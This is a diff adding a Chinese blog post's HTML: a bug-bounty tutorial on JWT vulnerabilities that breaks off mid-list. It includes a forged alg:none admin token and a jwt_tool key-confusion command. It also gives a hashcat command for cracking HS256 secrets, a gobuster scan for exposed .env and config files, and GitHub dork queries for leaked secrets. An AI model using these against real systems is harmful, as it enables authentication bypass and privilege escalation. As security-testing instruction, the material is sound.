@@ -1,0 +1,571 @@
+<!doctype html>
+<html lang="en"><head>
+<title>10.12-10.18 - Hexo</title>
+<meta charset="UTF-8">
+<meta name="keywords" content="">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5">
+
+<link rel="shortcut icon" href="/favicon.ico" type="image/x-icon" />
+<meta name="description" content="JWT一.JWT核心原理：从结构到认证逻辑JWT 的结构：三部分 Base64 编码拼接JWT 由Header（头部） 、Payload（载荷） 、Signature（签名）  三部分组成，用 . 分隔，格式如下： 1Header.payload.signature  （1）Header（头部）：指定算法与类型定义 JWT 的类型（typ: “JWT“）和签名算法（如alg: “HS256”、al">
+<meta property="og:type" content="article">
+<meta property="og:title" content="10.12-10.18">
+<meta property="og:url" content="https://zhi-yinfeng.github.io/2026/10/18/10.12-10.18/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="JWT一.JWT核心原理：从结构到认证逻辑JWT 的结构：三部分 Base64 编码拼接JWT 由Header（头部） 、Payload（载荷） 、Signature（签名）  三部分组成，用 . 分隔，格式如下： 1Header.payload.signature  （1）Header（头部）：指定算法与类型定义 JWT 的类型（typ: “JWT“）和签名算法（如alg: “HS256”、al">
+<meta property="og:locale" content="en_US">
+<meta property="article:published_time" content="2026-10-17T23:28:42.000Z">
+<meta property="article:modified_time" content="2026-10-18T10:26:01.998Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+
+<link rel="stylesheet" href="/lib/fancybox/fancybox.css">
+<link rel="stylesheet" href="/lib/mdui_043tiny/mdui.css">
+
+
+<link rel="stylesheet" href="/lib/iconfont/iconfont.css?v=1792319429462">
+
+<link rel="stylesheet" href="/css/style.css?v=1792319429462">
+
+
+
+
+    
+        <link rel="stylesheet" href="/custom.css?v=1792319429462">
+    
+
+
+
+<script src="/lib/mdui_043tiny/mdui.js" async></script>
+<script src="/lib/fancybox/fancybox.umd.js" async></script>
+<script src="/lib/lax.min.js" async></script>
+
+
+<script async src="/js/app.js?v=1792319429462"></script>
+
+ 
+
+<!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-4D4ZJ9G024"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag("js", new Date());
+
+  gtag("config", "G-4D4ZJ9G024");
+</script>
+
+
+<link rel="stylesheet"  href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.8.0/styles/atom-one-dark.min.css">
+<meta name="generator" content="Hexo 7.0.0"></head><body class="nexmoe mdui-drawer-body-left"><div id="nexmoe-background"><div class="nexmoe-bg" style="background-image: url(https://i.dawnlab.me/b5a7e61560facdd5b8aa9683fce147d7.png)"></div><div class="mdui-appbar mdui-shadow-0"><div class="mdui-toolbar"><a class="mdui-btn mdui-btn-icon mdui-ripple" mdui-drawer="{target: &#039;#drawer&#039;, swipe: true}" title="menu"><i class="mdui-icon nexmoefont icon-menu"></i></a><div class="mdui-toolbar-spacer"></div><a class="mdui-btn mdui-btn-icon" href="/" title="John Doe"><img src="https://cdn.jsdelivr.net/gh/nexmoe/nexmoe.github.io@latest/images/avatar.png" alt="John Doe"></a></div></div></div><div id="nexmoe-header"><div class="nexmoe-drawer mdui-drawer" id="drawer">
+    <div class="nexmoe-avatar mdui-ripple">
+        <a href="/" title="John Doe">
+            <img src="https://cdn.jsdelivr.net/gh/nexmoe/nexmoe.github.io@latest/images/avatar.png" alt="John Doe" alt="John Doe">
+        </a>
+    </div>
+    <div class="nexmoe-count">
+        <div><span>Articles</span>7</div>
+        <div><span>Tags</span>0</div>
+        <div><span>Categories</span>0</div>
+    </div>
+    <div class="nexmoe-list mdui-list" mdui-collapse="{accordion: true}">
+        
+        <a class="nexmoe-list-item mdui-list-item mdui-ripple false" href="/" title="回到首页">
+            <i class="mdui-list-item-icon nexmoefont icon-home"></i>
+            <div class="mdui-list-item-content">
+                回到首页
+            </div>
+        </a>
+        
+        <a class="nexmoe-list-item mdui-list-item mdui-ripple false" href="/archive.html" title="文章归档">
+            <i class="mdui-list-item-icon nexmoefont icon-container"></i>
+            <div class="mdui-list-item-content">
+                文章归档
+            </div>
+        </a>
+        
+        <a class="nexmoe-list-item mdui-list-item mdui-ripple false" href="/PY.html" title="我的朋友">
+            <i class="mdui-list-item-icon nexmoefont icon-unorderedlist"></i>
+            <div class="mdui-list-item-content">
+                我的朋友
+            </div>
+        </a>
+        
+        <a class="nexmoe-list-item mdui-list-item mdui-ripple false" target="_blank" rel="noopener" href="https://nexmoe.com/donate.html" title="给我赞助">
+            <i class="mdui-list-item-icon nexmoefont icon-coffee"></i>
+            <div class="mdui-list-item-content">
+                给我赞助
+            </div>
+        </a>
+        
+        <a class="nexmoe-list-item mdui-list-item mdui-ripple false" target="_blank" rel="noopener" href="https://i.nexmoe.com/" title="关于博主">
+            <i class="mdui-list-item-icon nexmoefont icon-info-circle"></i>
+            <div class="mdui-list-item-content">
+                关于博主
+            </div>
+        </a>
+        
+    </div>
+    
+    
+        
+        <div class="nexmoe-widget-wrap">
+    <div class="nexmoe-widget nexmoe-search">
+         
+            <form id="search_form" action_e="https://cn.bing.com/search?q=site:nexmoe.com" onsubmit="return search();">
+                <label><input id="search_value" name="q" type="search" placeholder="Search"></label>
+            </form>
+         
+    </div>
+</div>
+
+
+
+
+    
+        
+        <div class="nexmoe-widget-wrap">
+	<div class="nexmoe-widget nexmoe-social">
+		<a
+			class="mdui-ripple"
+			href="https://jq.qq.com/?_wv=1027&k=5CfKHun"
+			target="_blank"
+			mdui-tooltip="{content: 'QQ群'}"
+			style="
+				color: rgb(249, 174, 8);
+				background-color: rgba(249, 174, 8, .1);
+			"
+		>
+			<i
+				class="nexmoefont icon-QQ"
+			></i> </a
+		><a
+			class="mdui-ripple"
+			href="https://space.bilibili.com/20238211"
+			target="_blank"
+			mdui-tooltip="{content: '哔哩哔哩'}"
+			style="
+				color: rgb(231, 106, 141);
+				background-color: rgba(231, 106, 141, .1);
+			"
+		>
+			<i
+				class="nexmoefont icon-bilibili"
+			></i> </a
+		><a
+			class="mdui-ripple"
+			href="https://github.com/nexmoe/"
+			target="_blank"
+			mdui-tooltip="{content: 'GitHub'}"
+			style="
+				color: rgb(25, 23, 23);
+				background-color: rgba(25, 23, 23, .1);
+			"
+		>
+			<i
+				class="nexmoefont icon-github"
+			></i> </a
+		><a
+			class="mdui-ripple"
+			href="https://www.zhihu.com/people/nexmoe"
+			target="_blank"
+			mdui-tooltip="{content: '知乎'}"
+			style="
+				color: rgb(30, 136, 229);
+				background-color: rgba(30, 136, 229, .1);
+			"
+		>
+			<i
+				class="nexmoefont icon-zhihu"
+			></i> </a
+		><a
+			class="mdui-ripple"
+			href="https://twitter.com/nexmoe"
+			target="_blank"
+			mdui-tooltip="{content: 'Twitter'}"
+			style="
+				color: rgb(59, 151, 239);
+				background-color: rgba(59, 151, 239, .1);
+			"
+		>
+			<i
+				class="nexmoefont icon-twitter"
+			></i> </a
+		><a
+			class="mdui-ripple"
+			href="https://nexmoe.com/atom.xml"
+			target="_blank"
+			mdui-tooltip="{content: 'RSS'}"
+			style="
+				color: rgb(247, 132, 34);
+				background-color: rgba(247, 132, 34, .1);
+			"
+		>
+			<i
+				class="nexmoefont icon-rss"
+			></i> </a
+		>
+	</div>
+</div>
+
+    
+        
+        
+
+    
+        
+        
+    
+        
+        
+        
+  <div class="nexmoe-widget-wrap">
+    <h3 class="nexmoe-widget-title">Archive</h3>
+    <div class="nexmoe-widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2026/">2026</a><span class="archive-list-count">7</span></li></ul>
+    </div>
+  </div>
+
+
+
+    
+        
+        
+  <div class="nexmoe-widget-wrap">
+    <h3 class="nexmoe-widget-title">Recent Posts</h3>
+    <div class="nexmoe-widget">
+      <ul>
+        
+          <li>
+            <a href="/2026/10/18/CTF%E8%A7%A3%E9%A2%98%E6%80%9D%E8%B7%AF/">CTF解题思路</a>
+          </li>
+        
+          <li>
+            <a href="/2026/10/18/10.12-10.18/">10.12-10.18</a>
+          </li>
+        
+          <li>
+            <a href="/2026/09/23/9.21-9.27%E5%91%A8%E6%8A%A5/">SQL注入</a>
+          </li>
+        
+          <li>
+            <a href="/2026/09/18/9.14-9.20%E5%91%A8%E6%8A%A5/">9.14-9.20周报</a>
+          </li>
+        
+          <li>
+            <a href="/2026/09/09/week-report-9.7/">9.7-9.13周报</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+    
+        
+        <div class="nexmoe-widget-wrap">
+    <div class="nexmoe-widget nexmoe-link">
+		<ul>
+        
+            <li>
+                <a href="https://nexmoe.com/" target="_blank" >
+                    <img src="https://cdn.jsdelivr.net/gh/nexmoe/nexmoe.github.io@latest/images/avatar.png" alt="折影轻梦"></img>
+                    <p>折影轻梦</p>
+                </a>
+            </li>
+        
+		</ul>
+    </div>
+</div>
+<style>
+.nexmoe-widget-wrap .nexmoe-link ul li a {
+    text-align : center;
+}
+.nexmoe-widget-wrap .nexmoe-link ul li a img {
+    max-width : 100%;
+}
+.nexmoe-widget-wrap .nexmoe-link ul li a p {
+    margin: 10px 0;
+}
+</style>
+
+    
+   
+    <div class="nexmoe-copyright">
+        &copy; 2026 John Doe
+        Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+        & <a href="https://github.com/theme-nexmoe/hexo-theme-nexmoe" target="_blank">Nexmoe</a>
+        <br><a target="_blank" href="https://beian.miit.gov.cn/">鄂ICP备2020018486号</a>
+<br><a target="_blank" href="https://www.upyun.com/?utm_source=lianmeng&utm_medium=referral">
+<img src="https://i.dawnlab.me/c0268c1e6cfd0863d6ba35be1575941a.png" width="150px"></a>
+
+    </div>
+</div><!-- .nexmoe-drawer --></div><div id="nexmoe-content"><div class="nexmoe-primary"><div class="nexmoe-post">
+  <article>
+    
+        <div class="nexmoe-post-cover"> 
+            <img src="https://i.dawnlab.me/b5a7e61560facdd5b8aa9683fce147d7.png" alt="10.12-10.18" loading="lazy">
+            <h1>10.12-10.18</h1>
+        </div>
+    
+    
+    <div class="nexmoe-post-meta">
+    <div class="nexmoe-rainbow">
+        <a class="nexmoefont icon-calendar-fill">2026年10月18日</a>
+        
+        
+    </div>
+    
+    
+    
+    
+    
+</div>
+
+    <h1 id="JWT"><a href="#JWT" class="headerlink" title="JWT"></a>JWT</h1><h1 id="一-JWT核心原理：从结构到认证逻辑"><a href="#一-JWT核心原理：从结构到认证逻辑" class="headerlink" title="一.JWT核心原理：从结构到认证逻辑"></a>一.JWT核心原理：<strong>从结构到认证逻辑</strong></h1><h2 id="JWT-的结构：三部分-Base64-编码拼接"><a href="#JWT-的结构：三部分-Base64-编码拼接" class="headerlink" title="JWT 的结构：三部分 Base64 编码拼接"></a><strong>JWT 的结构：三部分</strong> Base64 <strong>编码拼接</strong></h2><p>JWT 由<strong>Header（头部）</strong> 、<strong>Payload（载荷）</strong> 、<strong>Signature（签名）</strong>  三部分组成，用 <strong>.</strong> 分隔，格式如下：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Header</span>.<span class="property">payload</span>.<span class="property">signature</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="（1）Header（头部）：指定算法与类型"><a href="#（1）Header（头部）：指定算法与类型" class="headerlink" title="（1）Header（头部）：指定算法与类型"></a>（1）Header（头部）：指定算法与类型</h3><p>定义 JWT 的类型（<strong>typ: “JWT</strong>“）和签名算法（如<strong>alg: “HS256”、alg: “RS256”</strong> ），Base64 编码后作为第一部分。</p>
+<p>例（HS256算法）：</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;alg&quot;</span><span class="punctuation">:</span><span class="string">&quot;HS256&quot;</span><span class="punctuation">,</span> <span class="comment">//哈希算法（HMAC SHA256,对称加密）</span></span><br><span class="line">  <span class="attr">&quot;typ&quot;</span><span class="punctuation">:</span><span class="string">&quot;JWT&quot;</span> <span class="comment">//令牌类型</span></span><br></pre></td></tr></table></figure>
+
+<p>Base64 编码后：eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9</p>
+<h3 id="（2）-Payload-（载荷）：存储用户身份信息"><a href="#（2）-Payload-（载荷）：存储用户身份信息" class="headerlink" title="（2） Payload （载荷）：存储用户身份信息"></a><strong>（2）</strong> Payload <strong>（载荷）：存储用户身份信息</strong></h3><p>包含 “声明（Claims）”，即用户数据（如用户 ID、角色、有效期），Base64 编码后作为第二部分（<strong>注意：Base64 编码可逆向，切勿存储敏感信息如密码）</strong> 。</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line"> <span class="attr">&quot;sub&quot;</span><span class="punctuation">:</span><span class="string">&quot;123456&quot;</span><span class="punctuation">,</span> <span class="comment">//用户ID</span></span><br><span class="line"> <span class="attr">&quot;role&quot;</span><span class="punctuation">:</span><span class="string">&quot;user&quot;</span><span class="punctuation">,</span> <span class="comment">//用户角色（普通用户）</span></span><br><span class="line"> <span class="attr">&quot;exp&quot;</span><span class="punctuation">:</span><span class="number">1717248000</span><span class="punctuation">,</span> <span class="comment">//过期时间（2024-06-01）</span></span><br><span class="line"> <span class="attr">&quot;iat&quot;</span><span class="punctuation">:</span><span class="number">1717161600</span> <span class="comment">//签发时间（2024-05-31）</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>Base64编码后：eyJzdWIiOiIxMjM0NTYiLCJyb2xlIjoidXNlciIsImV4cCI6MTcxNzI0ODAwMCwiaWF0IjoxNzE3MTYxNjAwfQ</p>
+<h3 id="（3）Signature（签名）：确保-Token-未被篡改"><a href="#（3）Signature（签名）：确保-Token-未被篡改" class="headerlink" title="（3）Signature（签名）：确保 Token 未被篡改"></a>（3）Signature（签名）：确保 Token 未被篡改</h3><p>服务器用 “密钥” 和 Header 指定的算法对 “Header.Base64 + Payload.Base64” 进行签名，防止 Token 被篡改。签名是 JWT 的 “安全核心”，分为两种算法类型：</p>
+<ul>
+<li>对称算法（如 HS256）：服务器与客户端共享同一个 “密钥（Secret）”，签名和验证都用该密钥；</li>
+<li>非对称算法（如 RS256）：服务器用 “私钥（Private Key）” 签名，客户端用 “公钥（Public Key）” 验证（公钥可公开，私钥需保密）。</li>
+</ul>
+<p>例（HS256 签名过程）：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 签名公式：HMACSHA256( Base64Encode(Header) + &quot;.&quot; + Base64Encode(Payload), Secret )</span></span><br><span class="line">HMACSHA256( <span class="string">&quot;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTYiLCJyb2xlIjoidXNlciIsImV4cCI6MTcxNzI0ODAwMCwiaWF0IjoxNzE3MTYxNjAwfQ&quot;</span>, <span class="string">&quot;my-secret-key&quot;</span> )</span><br></pre></td></tr></table></figure>
+
+<p>签名结果（第三部分）：Signature&#x3D;abc123…xyz</p>
+<h1 id="二-JWT-漏洞类型与原理：从签名到逻辑缺陷"><a href="#二-JWT-漏洞类型与原理：从签名到逻辑缺陷" class="headerlink" title="二.JWT 漏洞类型与原理：从签名到逻辑缺陷"></a>二.JWT 漏洞类型与原理：从签名到逻辑缺陷</h1><p>JWT 漏洞的核心是  <strong>“签名验证失效”</strong>  或  <strong>“密钥 &#x2F; 算法被滥用”</strong> ，导致攻击者可伪造 Token、篡改身份信息。以下是红队实战中高频出现的漏洞类型，按危害等级排序：</p>
+<h2 id="1-签名绕过漏洞（无需密钥伪造-Token）"><a href="#1-签名绕过漏洞（无需密钥伪造-Token）" class="headerlink" title="1.签名绕过漏洞（无需密钥伪造 Token）"></a>1.签名绕过漏洞（无需密钥伪造 Token）</h2><h3 id="（1）无签名算法（alg-“none”）"><a href="#（1）无签名算法（alg-“none”）" class="headerlink" title="（1）无签名算法（alg: “none”）"></a>（1）无签名算法（alg: “none”）</h3><ul>
+<li>原理：JWT 支持<strong>alg: “none”</strong> 算法（即 “无签名”），若服务器未禁用该算法，攻击者可将 Header 的<strong>alg</strong>改为<strong>none</strong>，删除 Signature 部分，直接篡改 Payload；</li>
+<li>触发条件：服务器未严格校验alg字段，或未强制要求签名（如仅验证 Header 和 Payload，忽略 Signature）；</li>
+</ul>
+<p>例：</p>
+<p>原始Token(HS256算法）：</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Header.Payload.Signature</span><br></pre></td></tr></table></figure>
+
+<p>伪造Token(无签名）：</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiIxMjM0NTYiLCJyb2xlIjoiYWRtaW4iLCJleHAiOjE3MTcyNDgwMDAsImlhdCI6MTcxNzE2MTYwMH0.</span><br></pre></td></tr></table></figure>
+
+<p>（注意最后一个.保留，Signature 部分为空）。</p>
+<h3 id="（2）算法降级攻击（如-RS256→HS256）"><a href="#（2）算法降级攻击（如-RS256→HS256）" class="headerlink" title="（2）算法降级攻击（如 RS256→HS256）"></a>（2）算法降级攻击（如 RS256→HS256）</h3><ul>
+<li>原理：非对称算法（如 RS256）中，服务器用私钥签名、公钥验证；若服务器存在逻辑缺陷，允许将<strong>alg</strong>从<strong>RS256</strong>改为<strong>HS256</strong>，攻击者可使用服务器的 “公钥” 作为 “对称密钥” 伪造签名（HS256 用密钥签名，而 RS256 的公钥可公开获取）；</li>
+<li>触发条件：服务器未校验<strong>alg</strong>与密钥的匹配关系，或公钥可被攻击者获取（如通过 <strong>&#x2F;.well-known&#x2F;jwks.json</strong>接口）；</li>
+</ul>
+<p>例：</p>
+<p>1.攻击者获取服务器 RS256 的公钥（如public.key）；<br>2. 将 Header 的alg改为HS256，用公钥作为密钥对篡改后的 Payload 签名；<br>3. 服务器接收 Token 后，错误地用 HS256 算法 + 公钥验证签名，导致伪造 Token 通过。</p>
+<h2 id="2-密钥泄露-弱密钥"><a href="#2-密钥泄露-弱密钥" class="headerlink" title="2.密钥泄露 &#x2F; 弱密钥"></a>2.密钥泄露 &#x2F; 弱密钥</h2><p>密钥是 JWT 签名的核心，若密钥泄露或过于简单，攻击者可直接用密钥伪造任意 Token。</p>
+<h3 id="（1）密钥硬编码-配置文件泄露"><a href="#（1）密钥硬编码-配置文件泄露" class="headerlink" title="（1）密钥硬编码 &#x2F; 配置文件泄露"></a>（1）密钥硬编码 &#x2F; 配置文件泄露</h3><ul>
+<li>原理：开发人员将 JWT 密钥（如 HS256 的<strong>my-secret-key</strong>）硬编码到代码中，或存储在公开可访问的配置文件（如<strong>config.js、application.properties</strong>）中，攻击者通过文件读取、代码泄露（如 GitHub）获取密钥；</li>
+<li>常见泄露路径：<br>◦ 代码托管平台：GitHub 搜索<strong>jwt secret</strong>+ 目标域名，找到硬编码的密钥；<br>◦ Web 目录： <strong>&#x2F;config.js、&#x2F;application.yml、&#x2F;.env</strong>等文件；<br>◦ 接口响应：错误页面、调试信息中泄露密钥。</li>
+</ul>
+<h3 id="（2）弱密钥（可爆破）"><a href="#（2）弱密钥（可爆破）" class="headerlink" title="（2）弱密钥（可爆破）"></a>（2）弱密钥（可爆破）</h3><ul>
+<li>原理：HS256 算法的密钥过于简单（如123456、password），攻击者用字典爆破密钥后，可伪造 Token；</li>
+<li>爆破条件：密钥长度短（≤8 位）、无特殊字符，适合用hashcat等工具爆破。</li>
+</ul>
+<h2 id="3-Payload-篡改（签名有效但内容可篡改）"><a href="#3-Payload-篡改（签名有效但内容可篡改）" class="headerlink" title="3.Payload 篡改（签名有效但内容可篡改）"></a>3.Payload 篡改（签名有效但内容可篡改）</h2><p>若服务器仅验证签名，未校验 Payload 中的关键字段（如<strong>role、exp</strong>），攻击者可在 “已知有效密钥” 的情况下篡改身份信息。</p>
+<h3 id="（1）角色篡改（普通用户→管理员）"><a href="#（1）角色篡改（普通用户→管理员）" class="headerlink" title="（1）角色篡改（普通用户→管理员）"></a>（1）角色篡改（普通用户→管理员）</h3><p>原理：Payload 中的<strong>role</strong>字段未被服务器二次校验，攻击者用合法密钥将<strong>role: “user”</strong> 改为<strong>role: “admin”</strong> ，获取管理员权限；</p>
+<p>例：</p>
+<p>原始Payload:</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;sub&quot;</span><span class="punctuation">:</span><span class="string">&quot;123&quot;</span><span class="punctuation">,</span><span class="attr">&quot;role&quot;</span><span class="punctuation">:</span><span class="string">&quot;user&quot;</span><span class="punctuation">,</span><span class="attr">&quot;exp&quot;</span><span class="punctuation">:</span><span class="number">1717248000</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>篡改后Payload：</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;sub&quot;</span><span class="punctuation">:</span><span class="string">&quot;123&quot;</span><span class="punctuation">,</span><span class="attr">&quot;role&quot;</span><span class="punctuation">:</span><span class="string">&quot;admin&quot;</span><span class="punctuation">,</span><span class="attr">&quot;exp&quot;</span><span class="punctuation">:</span><span class="number">1717248000</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>（用合法密钥重新签名）。</p>
+<h3 id="（2）有效期篡改（Token-永不过期）"><a href="#（2）有效期篡改（Token-永不过期）" class="headerlink" title="（2）有效期篡改（Token 永不过期）"></a>（2）有效期篡改（Token 永不过期）</h3><ul>
+<li><strong>原理</strong>​：​<code>exp</code>​字段（过期时间）未被服务器严格校验，攻击者将​<code>exp</code>​改为极大值（如​<code>9999999999</code>），使 Token 永不过期；</li>
+<li><strong>风险</strong>：即使用户注销，攻击者仍可使用该 Token 访问系统。</li>
+</ul>
+<h2 id="4-中危：Token-复用-未销毁"><a href="#4-中危：Token-复用-未销毁" class="headerlink" title="4. 中危：Token 复用 &#x2F; 未销毁"></a><strong>4. 中危：Token 复用 &#x2F; 未销毁</strong></h2><ul>
+<li>原理：用户注销或密码修改后，服务器未将旧 Token 加入 “黑名单”，攻击者可复用已注销的 Token 访问系统；</li>
+<li>触发条件：服务器未实现 Token 吊销机制（如 Redis 黑名单），依赖exp字段实现有效期控制。</li>
+</ul>
+<h1 id="三、SRC-中快速挖掘-JWT-漏洞：实战流程与技巧"><a href="#三、SRC-中快速挖掘-JWT-漏洞：实战流程与技巧" class="headerlink" title="三、SRC 中快速挖掘 JWT 漏洞：实战流程与技巧"></a>三、SRC 中快速挖掘 JWT 漏洞：实战流程与技巧</h1><p>SRC 中 JWT 漏洞的挖掘核心是  <strong>“识别 JWT 接口→测试签名 &#x2F; 密钥→验证权限篡改”</strong> ，需按以下步骤高效落地：</p>
+<h2 id="第一步：识别使用-JWT-的资产与接口"><a href="#第一步：识别使用-JWT-的资产与接口" class="headerlink" title="第一步：识别使用 JWT 的资产与接口"></a>第一步：识别使用 JWT 的资产与接口</h2><p>JWT 通常用于 “身份认证相关接口”，需优先测试以下场景：</p>
+<ul>
+<li>登录 &#x2F; 注册接口：登录成功后返回<strong>Authorization: Bearer</strong> 的接口；</li>
+<li>权限控制接口：如 <strong>&#x2F;api&#x2F;user&#x2F;info</strong>（获取用户信息）、 <strong>&#x2F;api&#x2F;admin&#x2F;</strong>* （管理员接口）；</li>
+<li>Token 刷新接口：如 <strong>&#x2F;api&#x2F;token&#x2F;refresh</strong>（返回新 JWT）。</li>
+</ul>
+<p>识别方法：</p>
+<ul>
+<li>用 Burp Suite 拦截所有请求，筛选 HTTP 头中包含<strong>Authorization: Bearer</strong>的请求；</li>
+<li>查看响应体，若包含token字（如 <strong>{“token”:”eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9…”}</strong> ），判定为 JWT 接口；</li>
+<li>用工具快速解码 JWT，查看 Payload 中的字段（如<strong>role、sub、exp</strong>）：</li>
+</ul>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"># 用jwt-cli解码（需提前安装）</span><br><span class="line">jwt decode eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTYiLCJyb2xlIjoidXNlciIsImV4cCI6MTcxNzI0ODAwMCwiaWF0IjoxNzE3MTYxNjAwfQ.abc123...</span><br></pre></td></tr></table></figure>
+
+<h2 id="第二步：按漏洞优先级测试-JWT"><a href="#第二步：按漏洞优先级测试-JWT" class="headerlink" title="第二步：按漏洞优先级测试 JWT"></a>第二步：按漏洞优先级测试 JWT</h2><h3 id="（1）优先测试签名绕过（最快验证，1-2-分钟-目标）"><a href="#（1）优先测试签名绕过（最快验证，1-2-分钟-目标）" class="headerlink" title="（1）优先测试签名绕过（最快验证，1-2 分钟 &#x2F; 目标）"></a>（1）优先测试签名绕过（最快验证，1-2 分钟 &#x2F; 目标）</h3><ul>
+<li><strong>测试无签名算法（alg: “none”）：</strong></li>
+</ul>
+<ol>
+<li>用 Burp 拦截 JWT 请求，复制 Token；</li>
+<li>解码 Token，修改 Header 的<strong>alg</strong>为<strong>none</strong>，删除 Signature 部分（保留最后一个.）；</li>
+<li>将篡改后的 Token 放回请求头，发送请求，观察是否能通过验证（如<strong>role</strong>改为<strong>admin</strong>后访问 <strong>&#x2F;api&#x2F;admin</strong>）；</li>
+<li>工具辅助：用 Burp 插件 “JWT Editor” 直接修改<strong>alg</strong>为<strong>none</strong>，一键生成伪造 Token。</li>
+</ol>
+<ul>
+<li><p><strong>测试算法降级（RS256→HS256）：</strong></p>
+</li>
+<li><p>若 JWT 算法为 RS256，尝试获取公钥（如访问 <strong>&#x2F;.well-known&#x2F;jwks.json</strong>，或用<strong>JWT_tool</strong>自动获取）；</p>
+</li>
+<li><p>用<strong>JWT_tool</strong>生成 HS256 伪造 Token：</p>
+</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 语法：jwt_tool &lt;Token&gt; -X k -pk public.key -alg HS256 -T &quot;&#123;&#x27;role&#x27;:&#x27;admin&#x27;&#125;&quot;</span></span><br><span class="line">jwt_tool eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9... -X k -pk public.key -alg HS256 -T <span class="string">&quot;&#123;&#x27;role&#x27;:&#x27;admin&#x27;&#125;&quot;</span></span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>发送伪造 Token，若能访问管理员接口，证明存在漏洞。</li>
+</ul>
+<h3 id="（2）次优先测试密钥泄露-弱密钥"><a href="#（2）次优先测试密钥泄露-弱密钥" class="headerlink" title="（2）次优先测试密钥泄露 &#x2F; 弱密钥"></a>（2）次优先测试密钥泄露 &#x2F; 弱密钥</h3><ul>
+<li><p><strong>查找密钥泄露：</strong></p>
+</li>
+<li><p>GitHub 搜索：<em><em>repo:target-org&#x2F;</em> jwt secret、”JWT_SECRET” “target.com”</em>* ；</p>
+</li>
+<li><p>Web 目录扫描：用<strong>Gobuster</strong>爆破常见配置文件路径：</p>
+</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster <span class="built_in">dir</span> -u http://target.com -w /usr/share/wordlists/dirb/common.txt -x js,yml,properties,<span class="built_in">env</span> -q</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p>查看页面源码：搜索<strong>jwt、secret、key</strong>等关键词，寻找硬编码的密钥（如<strong>const JWT_SECRET &#x3D; “my-weak-key”;</strong> ）。</p>
+</li>
+<li><p><strong>弱密钥爆破：</strong></p>
+</li>
+<li><p>用<strong>hashcat</strong>爆破 HS256 密钥（需先提取 JWT 的 “Header.Payload” 和 “Signature”）：</p>
+</li>
+</ul>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 语法：hashcat -m 16500 -a 0 &lt;JWT_hash&gt; &lt;wordlist&gt;</span></span><br><span class="line"><span class="comment"># -m 16500：JWT HS256算法类型；-a 0：字典攻击</span></span><br><span class="line">hashcat -m 16500 <span class="string">&quot;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTYiLCJyb2xlIjoidXNlciIsImV4cCI6MTcxNzI0ODAwMCwiaWF0IjoxNzE3MTYxNjAwfQ.abc123...&quot;</span> /usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>若爆破成功（如密钥为<strong>123456</strong>），用该密钥伪造管理员 Token。</li>
+</ul>
+<h3 id="（3）最后测试-Payload-篡改（需已知密钥）"><a href="#（3）最后测试-Payload-篡改（需已知密钥）" class="headerlink" title="（3）最后测试 Payload 篡改（需已知密钥）"></a>（3）最后测试 Payload 篡改（需已知密钥）</h3><p>测试角色篡改：</p>
+<ul>
